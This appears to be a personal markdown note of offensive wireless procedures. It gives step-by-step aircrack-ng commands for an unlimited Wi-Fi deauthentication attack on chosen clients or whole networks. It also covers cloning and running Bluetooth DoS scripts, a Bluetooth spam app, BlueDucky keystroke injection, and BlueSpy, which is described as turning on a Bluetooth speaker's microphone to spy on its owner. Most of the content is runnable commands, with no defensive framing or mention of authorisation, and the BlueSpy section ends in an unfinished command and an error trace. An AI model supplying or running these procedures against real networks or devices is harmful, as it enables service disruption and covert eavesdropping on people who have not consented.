<h1 align="center">Network Jamming / Network Spoofing</h1>

## Deauth. attack  

The **Deauth** attack perform on Wi-Fi (802.11) network only. It won't affect those people who are using internet via Ethernet cable (IEEE 802.3) i.e. wired cable. The target of this attach have 3 types :  
- [x] Attack on **a particular client** of a particular Wi-Fi's network (specific client if have/know his mac addreess)
- [x] Attack on **all clients** of a particular Wi-Fi's network (if don't know any client's MAC address)
- [x] Attack on **all Wi-Fi** available networks/routers directly.

> But to attack on Ethernet cable using clients, the methods are : ARP Spoofing / ARP Poisoning (Man-in-the-Middle Attack), DHCP Starvation or Rogue DHCP Attack, Switch MAC Flooding (CAM Table Overflow). But these we won't learn here, or maybe we'll learn it later. 

`~$` is local user.  
`~#` is root user.  

> Here :  
> for `-c` we mention channel no. of Wi-Fi network  
> for `-bssid` we mention the BSSID of Wi-Fi network  
> for `__STATION__` we mention the station/MAC-address of the Client  
<br>

#### Step 1 : Setup for Attack
First we need to convert the 'wlan0' interface to 'wlan0mon' interface, basically we are do setup & enabling the Wi-Fi's monitoring mode to do attack. For this we use the following commands :  
```
sudo su
iwconfig
ifconfig wlan0
airmon-ng
iwconfig wlan0
// airmon-ng start wlan0
airmon-ng check kill (2 times) . . .
airmon-ng stop wlan0 . . .
iw wlan0 del
airmon-ng start wlan0mon
iwconfig
rfkill list


clear
exit
exit
```
Run the above commands one-by-one only.  
<br>


#### Step 2 : Searching your targeted Wi-Fi network/router
Now run the following commands :  
```
sudo su

airodump-ng wlan0mon

- - -ctrl + C to stop
- - -Can close if done work
```
So, when it dispaly the required network then we can stop the process with 'ctrl + C' shortcut. But don't close this tab, it helps to copy network's channel no. & BSSID.  
<br>


#### Step 3 : Locking targeted Wi-Fi/router and Searching your targeted client
Now open new terminal tab and run the following commands :  
```
sudo su


airodump-ng wlan0mon --bssid "_" -c "_"
	(OR)
airodump-ng --bssid "_" -c "_" wlan0mon
	(OR)
airodump-ng -c_ -d "__BSS-ID__" wlan0mon


- - - - -Keep running, don't close
```
**Don't close it, keep running**. So, here we need to mentioned a particular Wi-Fi network's BSSID & channel no. And from this we are setting to attack on a particular Wi-Fi network. If want to attack all network then don't mention BSSID & channel no.
<br>
<br>


#### Step 4 : Attacking (on particular Client // on all Clients)
Now open new terminal tab and run the following commands :  
```
sudo su


aireplay-ng --deauth 0 -a "___BSS-ID___" -c "__STATION__" wlan0mon
	(OR)
besside-ng -c "_" wlan0mon	(==> this command is specialized for capturing Handshakes)


- - - - -ctrl + C ----😁
```
Here, if we want to attack all then don't mention BSSID & station of any client. Also, here `--deauth 0` means unlimited attack and we can even change it to `10` or `100` also.  
<br> 


#### Step 5 : Stoping/closing the setup (NOT REQUIRED)
If we have captured files in the '/Desktop' location from step-3, and after handshake happned from step-4, then we can close the step with the following command :  
```
airmon-ng stop wlan0mon
```
But this is not required as of now for us.  




---
---
---




## Bluetooth DoS attack

***Internet is mandatory here.  

#### Step 1 : Setup Bluetooth Enable (optional)
Check whether the Bluetooth is enabled or not. If not enabled then enable it and proceed to **next step**. But if the Bluetooth icon is not appearing, or it's not enabling, then follow the below commands :   
```
rfkill list all
	- - - sudo apt-get update (not required)
sudo apt reinstall blueman
sudo apt reinstall bluetooth
/etc/init.d/bluetooth status
sudo /etc/init.d/bluetooth start

clear

sudo systemctl list-unit-files --type=service
	to exit---> ctrl + C

sudo systemctl enable blueman-mechanism.service
sudo systemctl enable bluetooth.service
sudo systemctl list-unit-files --type=service

clear
exit
```
So, now the Bluetooth must be activated properly or can also refer to this [YouTube](https://youtu.be/w1MvrcBSNjw) video. And now we can go to next step.  
<br>


#### Step 2 (METHOD - 1) : Software Cloning from GitHub repo
Follow the below commands to get the copy of 'DOS attack' software : ([reference](https://github.com/crypt0b0y/BLUETOOTH-DOS-ATTACK-SCRIPT) github link)
```
sudo apt update
sudo apt install python3
sudo git clone https://github.com/jieggiI/BLUETOOTH-DOS-ATTACK-SCRIPT.git
cd BLUETOOTH-DOS-ATTACK-SCRIPT/
python3 Bluetooth-DOS-Attack.py
```
Here, the `git clone` command may ask for your 'username' & 'password' of GitHub account. But if it won't work, then we can use `https://github.com/crypt0b0y/BLUETOOTH-DOS-ATTACK-SCRIPT` instead of `https://github.com/jieggiI/BLUETOOTH-DOS-ATTACK-SCRIPT.git`.  
<br>
<br>


#### Step 2 (METHOD - 2) : Scanning & Attack device
Scan & Attack on device with the following mini-steps : 
- List all the connected / identified USB devices : `lsusb`
- List connected BT devices with thier status : `hciconfig`
- Turn on BT device : `hciconfig hci0 up`
- List connected BT devices with thier status : `hciconfig`
- Scan surrounding BT devices : `hcitool scan`
- Clone BT DoS attacke python script : `git clone https://github.com/xanonDev/BLUETOOTH-DOS-ATTACK-SCRIPT`
- List current directory content : `ls`
- Go into the repository directory : `cd BLUETOOTH-DOS-ATTACK-SCRIPT`
- List current directory content : `ls`
- Execute the DoS attack script : `python3 Bluetooth-DOS-Attack.py`
- Now to perform **Scan & Attack** follow the 'attack script' accordingly.

<br>

#### Can refer some some links : 
gg-deauth bluetooth
- https://hackmag.com/security/bluetooth-ddos/
- https://github.com/its0x08/blue-deauth
- https://null-byte.wonderhowto.com/how-to/bt-recon-snoop-bluetooth-devices-using-kali-linux-0165049/
- https://www.youtube.com/watch?v=pHqd1PnOk_4
- https://www.youtube.com/watch?v=IE_SLohDce0




---
---
---




## Bluetooth Mocking/Spam app
There is also an android bluetooth advertising/spammig app, we can get this app from [GitHub](https://github.com/simondankelmann/Bluetooth-LE-Spam).




---
---
---




## BlueDucky : Bluetooth HID keyboard injection attack
- To perform this attack, we need an extra 'ESP32 microcontrollers' that integrate both Wi-Fi and Bluetooth capabilities.  
- And we can get the software from [GitHub](https://github.com/pentestfunctions/BlueDucky) link which we install in Kali.  
- Then to perform scan & attack we can follow this [YouTube](https://youtu.be/IevVEUzXA30) video which contains steps.  




---
---
---




## BlueSpy : Bluetooth device scanning & Spying
***Internet is mandatory here.
In this technique a hacker compromise/hack a bluetooth device then ativates its  microphone and then do spy on the client. It easily attack on those bluetooth devices (speakers) which doesn't need any PIN parining for authentication.  


#### Step 1 : Python version checking & Updating
For this we need at least pythonV3.10, and to check it we use the following command :  
```
python3 --version
```
If the python version is less than 3.10, then we need to update it with the following command :  
```
sudo apt update
sudo apt install python3.10
```


#### Step 2 : Setup Bluetooth Enable (optional)
If bluetooth is not eanable or any related problem, then first enable Bluetooth with [this](https://github.com/stealthBS/demo1-repo/blob/main/network%20jamming.md#step-1--setup-bluetooth-enable-optional) step.  


#### Step 3 : Software Cloning from GitHub repo
```
sudo apt update
	- - - - sudo apt install python3   <optional. . .>

sudo git clone https://github.com/TarlogicSecurity/BlueSpy.git

cd BlueSpy/
	- - - - ls
	- - - - python3 BlueSpy.py -h
```
It is now running the BlueSpy, and to do scanning and Spying we follow next step.  


#### Step 4 : Scanning
To pefrom Scanning and finding the target follow the below command : 
```
bluetoothctl

scan on
```
Don't close this tab, keep running it on side-by-side screen. From here we can recognize our target device, and then we simply copy its **MAC address** from here.  


#### Step 5 : Spying details (not Attacking)
Open new tab side-by-side, and to perform Spying/recording the client follow the below command : (here we must be on `BlueSpy/` directory, otherwise follow step-2 last commands)  
```
python3 BlueSpy.py -a <MAC address>
```
From the above we will get a message whether the tageted device is vulnerable or not.

#### Step 6 : Spying through recording
Now recording to enable the recording follow the below commands : 
```
pactl set-card-profile . . . . .
```

Error : 
```
Traceback (most recent call last):
  File "/home/kali/BlueSpy/BlueSpy.py", line 5, in <module>
    from core import connect, BluezTarget, BluezAddressType, pair, record, playback
  File "/home/kali/BlueSpy/core.py", line 42, in <module>
    class BluezTarget:
  File "/home/kali/BlueSpy/core.py", line 46, in BluezTarget
    self, address: str, type: int | BluezAddressType = BluezAddressType.BR_EDR
TypeError: unsupported operand type(s) for |: 'type' and 'EnumMeta'
```


refer links : 
- https://github.com/TarlogicSecurity/BlueSpy
- https://youtu.be/zaujvnI3Tgg
- https://youtu.be/QIzFzlalycU
- https://youtu.be/gswt0CS61YU
---
---
---


pending links : 
- https://youtu.be/pk2OtnJV7xE
- https://youtu.be/-rSqbgI7oZM
- https://www.youtube.com/results?search_query=bluetooth+attack+kali
- https://youtu.be/JmQk4Yp9bww
- https://youtu.be/_bZOPKd8KyA
- https://youtu.be/yQaq40rfIBg - -
- https://youtu.be/Cm1eiV_A9Yk
- https://youtu.be/aETnndN_49g
- https://youtu.be/1KNsqJcLbu8
- https://youtu.be/1g98EkYEOQk
- https://youtu.be/teIaFOQjpcE
- https://youtu.be/gyItgM_Qkj4



🕸🕸make .md note keep it 

